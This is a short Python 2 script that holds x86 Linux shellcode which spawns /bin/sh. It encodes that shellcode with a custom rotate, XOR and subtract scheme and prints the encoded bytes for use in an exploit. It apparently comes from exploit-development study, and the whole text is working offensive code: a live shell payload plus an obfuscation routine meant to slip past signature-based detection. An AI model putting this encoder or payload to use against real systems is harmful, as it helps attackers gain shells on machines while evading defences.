#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


def ror(x, n, bits = 8):
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))
    

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

	y = ( ror(x,1) ^ 224 ) - 7
	encoded += '\\x'
	encoded += '%02x' % (y & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x,' %(y & 0xff)


print encoded2

print 'Len: %d' % len(bytearray(shellcode))
